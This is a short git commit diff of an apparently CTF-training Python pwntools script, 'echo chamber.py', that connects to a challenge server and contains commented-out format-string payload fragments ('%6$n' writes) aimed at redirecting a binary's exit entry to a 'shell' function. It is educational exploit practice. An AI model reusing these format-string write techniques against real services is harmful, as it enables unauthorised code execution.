db115bfb441a642bdd415eba32222525aa166b26
Billy Cao <aliencaocao@gmail.com>
2022-04-18 17:53:55 +0800

    Complete WiFi

--- cyberthon training/echo chamber.py
+++ cyberthon training/echo chamber.py
@@ -4,12 +4,12 @@ import struct
 io = remote('chals.cyberthon22t.ctf.sg', 20301)
 elf = context.binary = ELF('echo_chamber')
 win_addr = elf.symbols['shell']
-print(win_addr)
+# print(win_addr)
 exit_plt = 0x601040
 
 # payload = struct.pack('I', exit_plt)
-# payload += b'AAAABBBBCCCCDDDDEEEE'
-# # payload += b'%x ' * 10
+# payload = b'AAAABBBBCCCCDDDDEEEE'
+# payload += b'%x ' * 10
 # payload += b'%6$4196122x '
 # payload += b'%6$n'
 
